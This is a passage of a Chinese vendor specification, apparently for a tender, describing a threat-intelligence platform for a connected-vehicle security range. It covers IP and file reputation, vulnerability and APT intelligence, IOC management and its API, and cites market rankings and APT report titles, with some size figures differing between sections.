Router）是常用的网络匿名化工具。威胁情报中心可以通过分析网络流量、检测代理服务器和Tor节点等方式，判断该IP地址是否为代理或Tor网络主机。这些主机可能被攻击者用于隐藏其真实身份或发起攻击。</p><p>扫描机器人：扫描机器人是指自动化程序或恶意软件，用于扫描互联网上的目标主机，寻找潜在的漏洞和易受攻击的系统。威胁情报中心可能会监测和分析与扫描行为相关的数据，可以识别的扫描机器人和其活动。</p><h4 id="IP归属地和IP信誉评分"><a href="#IP归属地和IP信誉评分" class="headerlink" title="IP归属地和IP信誉评分"></a>IP归属地和IP信誉评分</h4><p>支持确定IP地址的归属地，帮助运营人员了解其来源和地理位置信息。按一定算法对IP进行信誉评分。</p><h2 id="漏洞情报"><a href="#漏洞情报" class="headerlink" title="漏洞情报"></a>漏洞情报</h2><p>支持针对当前的漏洞数据基于时间范围、漏洞名称、风险等级等维度进行漏洞情报查询。我们还可以实时监控漏洞更新数据，并以可视化卡片的形式展示当前的漏洞更新情况。</p><p>功能参数如下：</p><ul><li>可以针对当前的漏洞数据基于时间范围、漏洞名称、风险等级等维度进行漏洞情报查询。</li><li>可对漏洞情报的更新数据进行实时监控，通过可视化卡片的形式展示当前的漏洞更新情况。</li></ul><h3 id="漏洞情报功能说明"><a href="#漏洞情报功能说明" class="headerlink" title="漏洞情报功能说明"></a>漏洞情报功能说明</h3><h4 id="漏洞信息查询"><a href="#漏洞信息查询" class="headerlink" title="漏洞信息查询"></a>漏洞信息查询</h4><p>时间范围查询：支持指定一个时间范围，例如最近一周、最近一个月或自定义时间段，来查询在该时间范围内的漏洞数据。这样可以了解最新的漏洞情报和趋势。</p><p>漏洞名称查询：支持根据特定的漏洞名称或漏洞编号进行查询。这样可以针对关注的特定漏洞进行查询，了解其相关的详细信息和风险评级。</p><p>风险等级查询：可以根据漏洞的风险等级进行查询，例如高危、中危、低危等级，筛选出与关注的风险级别相匹配的漏洞信息。</p><p>支持图例标识漏洞和漏洞快捷筛选：提供图例解释不同类型安全事件的标识，同时允许用户根据特定类型或时间范围筛选感兴趣的安全事件。</p><h4 id="漏洞情报实时更新"><a href="#漏洞情报实时更新" class="headerlink" title="漏洞情报实时更新"></a>漏洞情报实时更新</h4><p>实时漏洞更新监控：威胁情报中心可以提供实时的漏洞更新数据，并以可视化卡片的形式展示当前的漏洞更新情况。支持通过监控这些卡片来了解最新的漏洞信息、修复建议和风险评估，以及可能受影响的系统和软件</p><h2 id="APT档案库"><a href="#APT档案库" class="headerlink" title="APT档案库"></a>APT档案库</h2><p>通过全球地图的可视化方式呈现全球活跃的APT组织和团伙，并支持检索和查看详细数据。APT组织团伙的数据包括团伙简介、团伙概述、技战法、APT情报、历史报告和关系图谱数据。</p><p>功能参数如下：</p><ul><li>通过全球地图可视化方式呈现全球活跃APT组织和团伙，同时支持检索和查看详情数据。</li><li>APT组织团伙包括如下数据：团伙简介、团伙概述、技战法、APT情报、历史报告和关系图谱数据。</li></ul><h3 id="APT档案库功能说明"><a href="#APT档案库功能说明" class="headerlink" title="APT档案库功能说明"></a>APT档案库功能说明</h3><h4 id="APT信息展示和查找"><a href="#APT信息展示和查找" class="headerlink" title="APT信息展示和查找"></a>APT信息展示和查找</h4><p>可视化地图：通过全球地图的可视化方式，直观地了解全球范围内活跃的APT组织和团伙的分布情况。这样可以帮助您对全球威胁态势有一个整体的认识。</p><p>检索和查看详细数据：使用搜索功能来检索特定的APT组织或团伙，并查看其详细数据。这些数据可能包括团伙的简介、概述、技术战术、APT情报、历史报告和关系图谱等信息。</p><p>团伙简介和概述：每个APT团伙都可以提供一个简介和概述，介绍该团伙的背景、活动特点和目标等信息。这样可以帮助您了解该团伙的基本情况。</p><p>APT活动热度:可以根据不同APT组织和团伙的活跃程度来呈现。这个指数可以展示在全球地图上，使用视觉化方式表现不同组织的活跃程度。</p><h4 id="APT信息分析和总结"><a href="#APT信息分析和总结" class="headerlink" title="APT信息分析和总结"></a>APT信息分析和总结</h4><p>技战法：技战法（TTPs，Tactics, Techniques, and Procedures）是APT团伙在攻击中使用的特定技术、战术和程序。威胁情报中心可以提供关于不同APT团伙常用的技战法的详细描述和示例。</p><p>APT情报和历史报告：威胁情报中心可以提供关于APT团伙的情报信息和历史报告。这些情报和报告可能包括与该团伙相关的最新威胁情报、攻击活动分析、受影响的行业或组织等信息。</p><p>关系图谱数据：关系图谱可以展示APT团伙之间的关联关系、合作关系、攻击目标等。这样可以帮助理解APT团伙之间的网络和行动关系。</p><h2 id="威胁情报平台技术参数"><a href="#威胁情报平台技术参数" class="headerlink" title="威胁情报平台技术参数"></a>威胁情报平台技术参数</h2><h3 id="软件及系统要求"><a href="#软件及系统要求" class="headerlink" title="软件及系统要求"></a>软件及系统要求</h3><p>操作系统： Centos7.5 develop版本</p><p>软件： gcc（yum install gcc）</p><p>gcc-c++（yum install gcc-c++）</p><h3 id="技术参数"><a href="#技术参数" class="headerlink" title="技术参数"></a>技术参数</h3><h4 id="企业私有威胁情报中心"><a href="#企业私有威胁情报中心" class="headerlink" title="企业私有威胁情报中心"></a>企业私有威胁情报中心</h4><p>收集和分析车联网系统内部和外部的威胁情报数据；整合和处理多个安全数据源，包括日志、事件、漏洞等信息；实时监测和检测潜在的威胁行为和攻击事件；生成针对企业车联网系统的定制化威胁情报报告；提供实时警报和通知，及时通知安全团队有关威胁事件的发生；支持威胁情报的可视化展示和交互式查询；与其他安全工具和系统进行集成，实现全面的威胁情报共享和联动防御；提供威胁情报的持续更新和定期的安全通告。通过企业私有威胁情报中心的功能，车联网安全靶场能够帮助企业实时了解车联网系统的威胁态势，提供定制化的威胁情报支持，加强对潜在威胁的监测和应对能力，从而提高整体的安全防护水平。</p><p>功能参数如下：</p><ul><li>支持企业私有威胁情报中心企业名称修改、更换企业LOGO；可对免登录状态下进行情报查询和威胁研判。</li><li>支持多源情报、企业情报结果聚合展示；对域名威胁分析查询，查询结果应包括开源情报、TTP情报、关联样本、可视化分析等；对域名解析查询，查询结果应包括当前解析记录、历史解析A记录、 历史解析的其他记录。</li><li>支持域名WHOIS信息查询，查询结果应包括当前注册信息、历史注册信息。</li><li>支持域名关联域名、数字证书、自定义情报、多源情报、白名单查询。</li><li>支持IP的威胁分析查询，查询结果应包括开源情报、TTP情报、关联样本、可视化分析等。</li><li>支持IP PDNS数据的反向查询、支持空间主机测绘数据查询、SSL证书、自定义情报、多源情报、白名单等。</li><li>支持文件研判查询，包括恶意类型、家族信息、文件大小、文件类型等。</li><li>支持文件的基本信息展示、网络行为、威胁分析、自定义情报、多源情报、白名单等。</li><li>支持从其他平台获取信息。</li><li>需要与安全运营中心对接，实现关联分析能力，提升安全威胁预警和研判分析能力。</li></ul><h5 id="企业定制化功能"><a href="#企业定制化功能" class="headerlink" title="企业定制化功能"></a>企业定制化功能</h5><p>企业私有威胁情报中心（以下简称“情报中心”）提供了一套完整的解决方案，允许企业在维持品牌一致性的同时，进行有效的安全威胁监测与分析。情报中心支持企业通过简易操作修改情报中心的企业名称和更换企业LOGO，确保平台与企业品牌形象保持一致。此外，情报中心允许用户在免登录的状态下进行情报查询和威胁研判，以便快速获取威胁情报。</p><h5 id="情报聚合与展示"><a href="#情报聚合与展示" class="headerlink" title="情报聚合与展示"></a>情报聚合与展示</h5><p>情报中心支持多源情报的聚合与展示，包括但不限于开源情报、商业情报提供商和行业情报共享平台的数据。对于域名威胁分析查询，情报中心提供了一个全面的查询结果，包括开源情报、TTP（战术、技术和程序）情报、关联样本和可视化分析。同时，情报中心还能够执行域名解析查询，提供当前解析记录、历史解析A记录以及其他类型的历史解析记录。</p><h5 id="域名信息查询"><a href="#域名信息查询" class="headerlink" title="域名信息查询"></a>域名信息查询</h5><p>情报中心支持对域名WHOIS信息的查询，用户可以获取到域名的当前注册信息和历史注册信息，这对于追踪域名所有权变更和历史背景非常有用。此外，情报中心还提供了域名关联查询功能，可查询域名关联的其他域名、数字证书信息、自定义情报、多源情报以及白名单信息。</p><h5 id="IP威胁分析"><a href="#IP威胁分析" class="headerlink" title="IP威胁分析"></a>IP威胁分析</h5><p>针对IP地址的威胁分析，情报中心提供了一个详尽的查询结果，包括开源情报、TTP情报、关联样本以及可视化分析。情报中心还支持IP PDNS数据的反向查询，以及空间主机测绘数据查询，包括SSL证书信息、自定义情报、多源情报和白名单数据。</p><h5 id="文件研判查询"><a href="#文件研判查询" class="headerlink" title="文件研判查询"></a>文件研判查询</h5><p>情报中心提供了文件研判查询功能，至少包括恶意类型、家族信息、文件大小、文件类型等信息。此外，情报中心还支持文件的基本信息展示、网络行为分析、威胁分析、自定义情报、多源情报以及白名单信息。</p><h5 id="外部平台信息集成"><a href="#外部平台信息集成" class="headerlink" title="外部平台信息集成"></a>外部平台信息集成</h5><p>情报中心支持从其他平台获取信息，以丰富情报数据源，确保情报的全面性。通过与外部安全平台的集成，情报中心能够获取更多维度的数据，增强威胁分析的准确性。</p><h5 id="安全运营中心对接"><a href="#安全运营中心对接" class="headerlink" title="安全运营中心对接"></a>安全运营中心对接</h5><p>情报中心设计了与安全运营中心的对接机制，实现了关联分析能力的提升。这一功能对于提升安全威胁预警和研判分析能力至关重要，它允许情报中心的用户利用安全运营中心的数据，进行更深入的分析和决策。</p><p>此外，与安全运营中心的对接也为情报中心带来了自动化的威胁情报处理和响应机制。这意味着企业可以更快地识别和响应潜在的安全威胁，同时能够利用安全运营中心的先进工具和技术，如自动化的事件响应流程和深度学习算法，以获得更准确的威胁预测。</p><h5 id="系统架构与技术实现"><a href="#系统架构与技术实现" class="headerlink" title="系统架构与技术实现"></a>系统架构与技术实现</h5><p>情报中心的系统架构旨在提供高性能、高可用性和可扩展性。使用先进的分布式计算框架和大数据技术，情报中心能够快速处理和分析大量的情报数据。通过采用微服务架构，情报中心确保了系统的模块化和灵活性，允许快速开发和部署新的功能。</p><h5 id="用户体验与界面设计"><a href="#用户体验与界面设计" class="headerlink" title="用户体验与界面设计"></a>用户体验与界面设计</h5><p>情报中心的用户界面设计注重用户体验，提供直观、易于使用的界面，以及丰富的交互式可视化工具。这些工具不仅加快了威胁识别和分析的过程，而且使得复杂数据的解读变得更加直观。</p><h5 id="安全与合规"><a href="#安全与合规" class="headerlink" title="安全与合规"></a>安全与合规</h5><p>情报中心在设计时充分考虑了安全和合规要求。所有数据传输均采用加密技术，确保数据在传输过程中的安全。此外，情报中心实现了细粒度的访问控制，确保只有授权用户才能访问敏感数据和功能。</p><h5 id="维护与支持"><a href="#维护与支持" class="headerlink" title="维护与支持"></a>维护与支持</h5><p>情报中心提供了全面的维护和支持服务，确保平台运行的高效性和安全性。这包括定期的系统升级、安全补丁的应用以及技术支持服务。</p><p>通过实现上述功能，企业私有威胁情报中心为企业提供了一个强大的工具，以识别、分析和响应各种网络安全威胁。通过情报的收集、分析和可视化展示，企业能够有效地提升其安全防护能力，降低安全风险，并加强对网络安全威胁的理解和控制。</p><h5 id="系统功能支持"><a href="#系统功能支持" class="headerlink" title="系统功能支持"></a>系统功能支持</h5><ul><li>企业私有威胁情报中心定制化功能：</li></ul><p>该系统支持企业用户自定义设置，包括修改企业名称和更换企业LOGO，以符合企业的品牌识别需求。此外，它还提供了无需登录即可进行情报查询和威胁研判的功能，便于快速获取威胁情报信息。</p><ul><li>情报聚合与域名威胁分析：</li></ul><p>系统能够整合多源情报，并将企业自身的情报结果进行聚合展示。对于域名威胁分析，系统提供了包括开源情报、TTP（Tactics, Techniques, and Procedures）情报、关联样本和可视化分析在内的综合查询结果。</p><ul><li>域名解析记录查询：</li></ul><p>用户可以查询域名的当前解析记录以及历史解析记录，包括A记录和其他类型的记录，从而获得域名解析变化的全面视图。</p><ul><li>域名WHOIS信息查询：</li></ul><p>该功能支持查询域名的当前和历史注册信息，帮助用户追踪域名的所有权变更和注册信息的历史变动。</p><ul><li>域名关联查询：</li></ul><p>系统提供了域名关联分析的能力，包括关联域名、数字证书、自定义情报和多源情报的查询，以及白名单功能，用于排除已知安全的域名。</p><ul><li>IP威胁分析：</li></ul><p>对于IP地址，系统能够进行威胁分析查询，给出包括开源情报、TTP情报、关联样本和可视化分析在内的详尽信息。</p><ul><li>IP PDNS数据和空间主机测绘数据查询：</li></ul><p>支持IP地址的PDNS（Passive DNS）数据反向查询，以及空间主机测绘数据查询，包括SSL证书信息、自定义情报、多源情报和白名单等。</p><ul><li>文件研判查询：</li></ul><p>系统支持对文件进行研判查询，提供至少包括恶意类型、家族信息、文件大小、文件类型等基本信息的查询结果。</p><ul><li>文件威胁分析：</li></ul><p>对于文件，系统不仅展示基本信息，还提供网络行为、威胁分析、自定义情报、多源情报和白名单等详细分析。</p><ul><li>跨平台信息获取：</li></ul><p>该系统支持从其他平台获取信息，增强了情报的广度和深度，为用户提供更全面的威胁情报。</p><ul><li>安全运营中心（SOC）对接与关联分析：</li></ul><p>系统支持与安全运营中心的对接，实现关联分析能力，提升了安全威胁预警和研判分析的能力，帮助企业更有效地识别、评估和应对安全威胁。</p><h4 id="情报管理"><a href="#情报管理" class="headerlink" title="情报管理"></a>情报管理</h4><p>威胁情报系统是一种能够收集、整合和分析多个来源的威胁情报数据，并提供实时更新、自动化处理和与其他安全工具集成的系统。它能够帮助安全团队评估和分类威胁，生成报告和可视化展示，并保护情报的机密性和完整性。通过这些功能，安全团队能够更好地了解和应对威胁事件，提高整体的安全防护能力，以下是实现此功能的相关参数。</p><p>功能参数如下：</p><ul><li>支持本地情报库，通过web界面查询以及生命周期管理。</li><li>支持用户手动录入情报，对应格式应包含IP、域名、URL、SHA1、MD5等。录入内容字段应包括恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等。</li><li>支持非结构化情报接入：支持非结构化情报导入，格式不限于docx、pdf、txt等。</li><li>支持用户自定义IOC情报开启与停用功能，支持在API查询中被调用，支持与汽车安全运营中心、靶场对接，实现关联性分析。</li><li>支持用户基于域名、IP、MD5、URL进行自定义白名单添加功能并支持批量删除功能。</li><li>支持Feed情报源接入：支持针对接入的情报源进行置信度标记、置信度展示、状态显示、情报源启停等功能。</li><li>支持API接口类情报接入：包括通过指定情报源和API方式进行获取。</li><li>支持对本地情报库各类情报统计并支持记录更新情况，能够显示情报添加时间及更新时间。</li><li>支持Restful-API接口输出：支持失陷检测情报、文件信誉情报、IP信誉情报、汽车漏洞情报接口批量查询。支持配置用户认证账号、密钥KEY的添加、删除管理。</li><li>支持提供并显示API接口请求配置参数说明。</li><li>支持情报白名单管理功能：可基于IP、URL、DAMAIN、SHA1、MD5类型进行新增及批量删除功能。</li></ul><h5 id="情报管理内容参数"><a href="#情报管理内容参数" class="headerlink" title="情报管理内容参数"></a>情报管理内容参数</h5><ul><li>收集、整合和分析多个来源的威胁情报数据：系统能够从多个来源收集、整合和分析威胁情报数据。这些数据可以来自内部和外部的安全数据源，如威胁情报共享平台、安全厂商、社交媒体等。</li><li>建立情报库和知识图谱：系统能够建立情报库和知识图谱，用于存储和组织威胁情报信息。这样可以方便地检索和查询相关的威胁情报，帮助安全团队更好地了解和分析威胁事件。</li><li>进行情报评估和分类：系统能够对收集到的威胁情报进行评估和分类，确定威胁的优先级和严重程度。这样可以帮助安全团队优先处理高优先级的威胁，并采取相应的防御措施。</li><li>实时更新和共享威胁情报：系统能够实时更新和共享威胁情报，提供给安全团队和相关利益相关者。这样可以确保所有相关方都能及时获得最新的威胁情报，从而做出相应的决策和应对措施。</li><li>支持自动化情报处理和分析：系统支持自动化的情报处理和分析。通过使用机器学习和自然语言处理等技术，系统能够自动提取关键信息和趋势，帮助安全团队更高效地分析威胁情报。</li><li>与其他安全工具和系统集成：系统可以与其他安全工具和系统进行集成，实现威胁情报的联动防御。这样可以提高整体的安全防护能力，并加强对潜在威胁的监测和应对能力。</li><li>生成情报报告和可视化展示：系统能够生成情报报告和提供可视化展示功能。通过报告和图表等形式，系统可以帮助用户更好地理解和决策，以及向相关方传达威胁情报的重要信息。</li><li>保护情报的机密性和完整性：系统确保情报的机密性和完整性，采取必要的安全措施，防止安全团队的敏感信息被泄露。这包括访问控制、加密和安全审计等措施</li></ul><h5 id="情报管理详细技术参数"><a href="#情报管理详细技术参数" class="headerlink" title="情报管理详细技术参数"></a>情报管理详细技术参数</h5><ul><li>支持用户手动录入情报，录入内容字段包括恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等。用户可以通过web界面进行情报录入，并进行生命周期管理，包括查询、编辑和删除等操作。</li><li>支持本地情报库，用户可以使用web界面查询本地情报库中的情报，并进行生命周期管理。可以查看情报的详细信息，包括相关IP、域名、URL、SHA1、MD5等信息。</li><li>支持非结构化情报接入，用户可以将非结构化情报导入系统，支持多种格式，如docx、pdf、txt等。系统将自动解析并存储导入的情报内容，方便用户进行查询和分析。</li><li>支持用户自定义IOC情报的启用和停用功能，用户可以根据需要灵活控制情报的使用。此外，还支持将IOC情报与汽车安全运营中心、靶场等系统对接，实现关联性分析，提升威胁识别和应对能力。</li><li>支持用户基于域名、IP、MD5、URL进行自定义白名单的添加和批量删除功能。用户可以将特定的域名、IP、MD5、URL添加到白名单中，以免受到误报的干扰，同时也支持批量删除白名单中的项。</li><li>支持Feed情报源的接入，用户可以将外部情报源接入系统，对接的情报源可以进行置信度标记、置信度展示、状态显示、启停等操作。用户可以根据情报源的可信度进行筛选和分析。</li><li>支持API接口类情报的接入，用户可以通过指定情报源和API方式获取数据。系统提供相应的API接口，用户可以根据需要进行调用，获取特定类型的情报数据。</li><li>支持对本地情报库各类情报进行统计，并记录情报的添加时间和更新时间。用户可以查看情报的统计信息，了解情报库中的情报数量和更新情况。</li><li>支持Restful-API接口输出，提供失陷检测情报、文件信誉情报、IP信誉情报、汽车漏洞情报等接口进行批量查询。用户可以配置认证账号和密钥KEY，进行接口的管理和授权。</li><li>支持提供并显示API接口请求配置参数说明，用户可以查看API接口的请求配置参数说明，方便正确使用和调用接口。</li><li>支持情报白名单管理功能，用户可以基于IP、URL、DOMAIN、SHA1、MD5类型进行新增和批量删除。用户可以将特定的IP、URL、域名、SHA1、MD5添加到白名单中，以免受到误报的影响，同时也可以批量删除白名单中的项</li></ul><h4 id="失陷检测情报-1"><a href="#失陷检测情报-1" class="headerlink" title="失陷检测情报"></a>失陷检测情报</h4><p>本地失陷主机情报库由安恒信息提供，该系统支持全球汽车和网络安全情报的收集，包括IP信誉、域名信誉、文件信誉、APT跟踪等。我们提供本地失陷主机情报库，获得了Gartner和IDC的认可。全球活跃APT组织和团伙通过全球地图可视化展示。查询请求通过HTTPS协议进行加密传输，每次查询都返回状态说明和详细结果。支持多种形式的IOC查询，结果包括告警名称、威胁类型、攻击团伙等信息。用户可自定义标签，支持在线和离线升级，具备强大的APT监控能力。</p><p>功能参数如下：</p><ul><li>支持本地失陷主机情报库，用于检测内网失陷主机，本地失陷主机情报数量1000万余条，近三年获得IDC中国安全分析和威胁情报前三名（提供截图并附报告证明）；通过全球地图可视化方式呈现全球活跃APT组织和团伙，数量不少于20个，同时支持检索APT团伙数据和查看详情数据，提供不少于3个针对中国的首发APT分析报告。截图及报告证明如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f5622e2d37bdf2ef19c74efc537a434a.jpeg" alt="2020年市场分析"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6056be48d3c1739bd3fed3c0a90cff74.jpeg" alt="2021年市场分析"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/aef3e133fe918cf83584d7cbbf5c3088.jpeg" alt="2022市场分析"></p><p>2020、2021、2022年IDC中国安全分析和威胁情报，安恒均排名第三</p><ol><li>XDSpy 组织针对我国的钓鱼攻击活动分析报告</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c42d16b4e38fb3d834f3dbcfe62c2e15.png" alt="企业微信截图_17035145656642"></p><ol><li>TeamSpy Crew 组织攻击手法和活跃线索分析报告</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dcbfdf763ae82d14648358df7a5e77a1.png" alt="企业微信截图_17035145764125"></p><ol><li>Kimsuky 组织的网络攻击活动分析报告</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7526a83aa34c172c4120d906f6d92a60.png" alt="企业微信截图_17035146303830"></p><ul><li>支持请求方式需采用post方式，并基于https协议进行SSL加密。</li><li>支持每次查询需要有返回结果的状态说明。</li><li>IOC格式需包括域名、域名+端口、URL、IP等不同形式，并适用于多种类型的远控服务器检测。</li><li>系统查询结果需要包括告警名称、最早发现时间、威胁类型、恶意家族、攻击链阶段、攻击团伙、置信度、当前状态、IOC类型、恶意类型、影响平台、风险等级、是否定向攻击等信息。</li><li>支持查询结果添加自定义Tag信息，再次查询时显示在查询结果中。</li><li>支持多种升级方式，包括在线升级与离线升级包方式。威胁情报提供准小时级升级机制。离线包支持天级升级机制。</li><li>我司所投情报具备较强的APT监控能力，支持APT情报信息，包含APT攻击事件、勒索软件、蠕虫木马、黑客工具、僵尸网络、后门软件等关键威胁。</li></ul><h5 id="失陷情报收集"><a href="#失陷情报收集" class="headerlink" title="失陷情报收集"></a>失陷情报收集</h5><ul><li>支持全球不同来源的汽车安全情报和网络安全情报数据收集，包括IP信誉、域名信誉、文件信誉、APT跟踪和历史活跃信息等。</li><li>提供本地失陷主机情报库，用于检测内网失陷主机，本地失陷主机情报数量1450万条，并在近三年获得了IDC中国安全分析和威胁情报前三名的评选。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f5622e2d37bdf2ef19c74efc537a434a.jpeg" alt="2020年市场分析"></p><p>2020年IDC中国安全分析和威胁情报，安恒排名第三</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b49711a2877c087430b55686664db4b7.jpeg" alt="2021年市场分析"></p><p>2021年IDC中国安全分析和威胁情报，安恒排名第三</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0a7714a40b550f79063c27aadacb1886.jpeg" alt="2022市场分析"></p><p>2022年IDC中国安全分析和威胁情报，安恒排名第三</p><h5 id="失陷情报可视化展示"><a href="#失陷情报可视化展示" class="headerlink" title="失陷情报可视化展示"></a>失陷情报可视化展示</h5><ul><li>失陷情报可视化地图具备实时监控功能，能够追踪全球范围内的APT活动。地图上的热点表示APT活动的地理位置，颜色深浅和大小表示活动的规模和严重程度。这种直观的表示方式可以帮助用户快速识别威胁集中的区域，该可视化展示数量达20个。支持检索APT团伙数据和查看详情数据，并提供3个针对中国的首发APT分析报告。</li></ul><p>3个APT分析报告如下：</p><ol><li>XDSpy 组织针对我国的钓鱼攻击活动分析报告</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c42d16b4e38fb3d834f3dbcfe62c2e15.png" alt="企业微信截图_17035145656642"></p><ol><li>TeamSpy Crew 组织攻击手法和活跃线索分析报告</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dcbfdf763ae82d14648358df7a5e77a1.png" alt="企业微信截图_17035145764125"></p><ol><li>Kimsuky 组织的网络攻击活动分析报告</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7526a83aa34c172c4120d906f6d92a60.png" alt="企业微信截图_17035146303830"></p><h5 id="失陷情报查询"><a href="#失陷情报查询" class="headerlink" title="失陷情报查询"></a>失陷情报查询</h5><ul><li>当用户进行查询时，系统支持使用POST方式提交查询请求，并通过HTTPS协议进行SSL加密，以确保查询过程中数据的安全传输。每次查询都会返回查询结果的状态说明，让用户了解查询是否成功以及结果的可用性。</li><li>在查询过程中，用户可以使用多种形式的IOC（指标信息）来进行查询，以满足不同类型的远程控制服务器检测需求。系统支持的IOC类型包括域名、域名+端口、URL、IP等。</li><li>查询结果将提供丰富的信息，包括告警名称、最早发现时间、威胁类型、恶意家族、攻击链阶段、攻击团伙、置信度、当前状态、IOC类型、恶意类型、影响平台、风险等级、是否定向攻击等。这些信息将帮助用户全面了解查询结果的特征和威胁程度。</li><li>为了方便用户管理查询结果，系统还支持为查询结果添加自定义的Tag信息。用户可以为特定的查询结果添加标签，以便在后续的查询中能够快速识别和标记特定的结果。这样可以提高查询结果的组织和分类能力，方便用户进行进一步的分析和处理。</li><li>系统联动查询，系统可以与全流量威胁检测系统进行联动查询，将引流的流量传递给威胁检测系统进行进一步的分析和处理。这样可以提高整体失陷威胁检测和应对能力。</li></ul><h5 id="失陷情报升级管理"><a href="#失陷情报升级管理" class="headerlink" title="失陷情报升级管理"></a>失陷情报升级管理</h5><ul><li>支持在线升级和离线升级包方式，提供准小时级的在线升级机制和天级的离线升级机制。</li><li>另外提供即时更新机制，加大对主机失陷情报的收集。</li></ul><h5 id="失陷情报具备APT监控能力"><a href="#失陷情报具备APT监控能力" class="headerlink" title="失陷情报具备APT监控能力"></a>失陷情报具备APT监控能力</h5><ul><li>具备强大的APT监控能力，提供关键威胁情报，包括APT攻击事件、勒索软件、蠕虫木马、黑客工具、僵尸网络、后门软件等。</li><li>失陷相关APT组织的查询和关联分析能力。</li></ul><p>功能介绍如下：</p><p>APT监控能力：</p><p>系统具备实时监控网络流量和主机活动的能力，以便于检测和识别可能的APT攻击。</p><p>使用高级分析和模式识别技术来识别异常行为，这些异常行为可能表明APT攻击者正在尝试或已经渗透了网络。</p><p>关键威胁情报提供：</p><p>系统提供综合的威胁情报服务，这些服务包括但不限于：</p><p>APT攻击事件：识别和记录高级威胁行为，如潜伏期长、手法复杂的定向攻击事件。</p><p>勒索软件：监测勒索软件活动，提供加密行为和勒索通信的警报。</p><p>蠕虫木马：侦测自我复制和传播的恶意软件，提供感染路径和潜在影响的分析。</p><p>黑客工具：识别网络中使用的已知黑客工具和脚本，这些工具可能用于执行攻击。</p><p>僵尸网络：监控潜在的僵尸网络活动，包括异常的网络流量和C&amp;C（命令和控制）服务器通信。</p><p>后门软件：检测并警报潜在的后门安装，这些后门可能用于远程访问和控制受感染的系统。</p><p>失陷相关APT组织的查询：</p><p>系统能够对已知的APT组织进行查询，这些查询可以基于各种指标，如攻击模式、使用的恶意软件类型、受害者类型等。</p><p>提供数据库查询功能，允许用户搜索特定APT组织的历史活动和相关情报。</p><p>关联分析能力：</p><p>系统支持对APT攻击事件进行关联分析，以确定攻击之间的相互联系。</p><p>关联分析可以揭示攻击的共同特征，如使用相同的漏洞、恶意软件或攻击基础设施。</p><p>分析结果可以帮助安全团队确定攻击者的目的、策略、手法和程序（TTPs），并采取相应的防御措施。</p><h4 id="文件信誉情报-1"><a href="#文件信誉情报-1" class="headerlink" title="文件信誉情报"></a>文件信誉情报</h4><p>提供文件信誉情报相关的功能和数据。其中包括样本哈希值，用于唯一标识文件并进行索引和查询。提供文件是否被认定为恶意文件的信息，以及具体的恶意类型，如病毒、木马、蠕虫等。如果文件属于已知的恶意软件家族，我们也提供相应的家族信息，提高查询效率。</p><p>功能参数如下：</p><ul><li>支持本地文件信誉库，本地文件信誉热点库规模1000万，云端信誉库规模200亿级，包括文件的HASH信息（MD5、SHA1），支持研判文件样本是否恶意、恶意类型、攻击团伙、家族信息、样本名称、文件类型、文件样本大小、最早发现时间以及定向攻击等信息。</li><li>支持多种升级方式，包括在线升级与离线升级包方式。威胁情报提供准小时级升级机制。离线包支持天级升级机制。</li><li>支持本地查询不到的数据可到云端信誉库进行查询后返回信息至本地，方便后期查询。</li></ul><h5 id="样本分析和查询"><a href="#样本分析和查询" class="headerlink" title="样本分析和查询"></a>样本分析和查询</h5><ul><li>样本哈希值：提供文件的唯一标识符，用于索引和查询文件信誉情报</li><li>文件是否恶意：标识文件是否被认定为恶意文件</li><li>恶意类型：如果文件被认定为恶意文件，提供具体的恶意类型，如病毒、木马、蠕虫等</li><li>家族信息：如果文件属于已知的恶意软件家族，提供相应的家族信息</li><li>提供对样本详细信息进行查询</li><li>云端查询：支持本地查询不到的数据可到云端信誉库进行查询后返回信息至本地，方便后期查询。</li><li>文件信誉评分、来源：文件信息评分用于表示文件的信任级别或可信度。指示文件的来源信息，包括文件的来源网站、用户上传等信息。</li></ul><h5 id="文件样本收集与存储"><a href="#文件样本收集与存储" class="headerlink" title="文件样本收集与存储"></a>文件样本收集与存储</h5><ul><li>文件信誉数据缓存库：本地维护的缓存库，本地文件信誉热点库规模1500万，存储文件信誉数据，提高查询效率，如果缓存库中未命中数据，则向云端查询，云端库拥有250百亿条以上的数据，包括文件的HASH信息（MD5、SHA1），支持研判文件样本。</li></ul><h5 id="文件信誉更新"><a href="#文件信誉更新" class="headerlink" title="文件信誉更新"></a>文件信誉更新</h5><ul><li>支持多种更新机制，包括在线和离线更新机制，支持即时更新，在线更新方式会同步到定时任务，获取到更新提示，自动更新，离线更新支持按天数更新，及时更新离线更新包。</li></ul><h4 id="IP信誉情报-1"><a href="#IP信誉情报-1" class="headerlink" 